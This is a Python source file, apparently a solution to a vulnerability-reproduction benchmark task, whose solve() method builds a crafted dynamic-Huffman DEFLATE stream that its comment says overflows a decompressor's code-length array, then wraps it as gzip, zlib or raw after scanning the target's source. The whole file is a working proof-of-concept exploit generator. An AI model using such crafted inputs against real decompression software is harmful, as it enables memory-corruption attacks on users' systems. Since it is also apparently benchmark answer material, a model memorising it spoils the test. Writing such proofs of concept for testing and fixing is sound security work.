import os
import re
import tarfile
from typing import Optional


class Solution:
    def _bitpack_lsb(self, items):
        out = bytearray()
        acc = 0
        bitpos = 0
        for val, nbits in items:
            for i in range(nbits):
                acc |= ((val >> i) & 1) << bitpos
                bitpos += 1
                if bitpos == 8:
                    out.append(acc & 0xFF)
                    acc = 0
                    bitpos = 0
        if bitpos:
            out.append(acc & 0xFF)
        return bytes(out)

    def _make_deflate_payload(self) -> bytes:
        # Dynamic Huffman, crafted to overflow code-length array (expects 15 but reads 16)
        # BFINAL=1, BTYPE=2 (dynamic), HLIT=0, HDIST=0, HCLEN=12 => (HCLEN+4)=16
        # Provide 16 code-length-code lengths; set only symbols 18 and 0 to length 1, others 0.
        # Order for first 16: [16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2]
        clen_vals = [0, 0, 1, 1] + [0] * 12  # 16 values
        items = [
            (1, 1),   # BFINAL
            (2, 2),   # BTYPE=2
            (0, 5),   # HLIT
            (0, 5),   # HDIST
            (12, 4),  # HCLEN
        ]
        for v in clen_vals:
            items.append((v, 3))
        payload = self._bitpack_lsb(items)
        if len(payload) < 9:
            payload += b"\x00" * (9 - len(payload))
        return payload[:9]

    def _wrap_gzip(self, deflate_payload: bytes) -> bytes:
        header = bytes([0x1F, 0x8B, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF])
        trailer = b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
        return header + deflate_payload + trailer

    def _wrap_zlib(self, deflate_payload: bytes) -> bytes:
        # zlib header: 0x78 0x9C (check bits OK, no preset dict)
        # Adler32 for empty output: 0x00000001
        return b"\x78\x9C" + deflate_payload + b"\x00\x00\x00\x01"

    def _scan_text(self, data: bytes) -> str:
        try:
            return data.decode("utf-8", "ignore").lower()
        except Exception:
            return ""

    def _detect_format(self, src_path: str) -> str:
        # Heuristic detection based on source contents.
        # Defaults to gzip (project name suggests gzip).
        text_blobs = []
        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        if not fn.lower().endswith((".c", ".h", ".cc", ".cpp", ".hpp")):
                            continue
                        p = os.path.join(root, fn)
                        try:
                            if os.path.getsize(p) > 2_000_000:
                                continue
                            with open(p, "rb") as f:
                                text_blobs.append(self._scan_text(f.read()))
                        except Exception:
                            continue
            else:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = (m.name or "").lower()
                        if not name.endswith((".c", ".h", ".cc", ".cpp", ".hpp")):
                            continue
                        if m.size > 2_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            text_blobs.append(self._scan_text(f.read()))
                        except Exception:
                            continue
        except Exception:
            return "gzip"

        all_text = "\n".join(text_blobs)
        if not all_text:
            return "gzip"

        if "png" in all_text and "ihdr" in all_text and "idat" in all_text:
            # If it looks like PNG-only code, it's likely zlib/deflate; but still return zlib.
            return "zlib"

        if "gzip" in all_text or "gunzip" in all_text:
            return "gzip"

        # Look for gzip magic checks: 0x1f 0x8b close by
        if re.search(r"0x1f.{0,40}0x8b|0x8b.{0,40}0x1f", all_text):
            return "gzip"

        if "adler32" in all_text or "adler" in all_text:
            return "zlib"

        if re.search(r"\bcmf\b|\bflg\b", all_text) and ("0x78" in all_text or "zlib" in all_text):
            return "zlib"

        # If explicit raw deflate/inflate without wrapper is suggested
        if "raw deflate" in all_text or "btype" in all_text or "hlit" in all_text:
            return "raw"

        return "gzip"

    def solve(self, src_path: str) -> bytes:
        deflate_payload = self._make_deflate_payload()
        fmt = self._detect_format(src_path)
        if fmt == "zlib":
            return self._wrap_zlib(deflate_payload)
        if fmt == "raw":
            return deflate_payload
        return self._wrap_gzip(deflate_payload)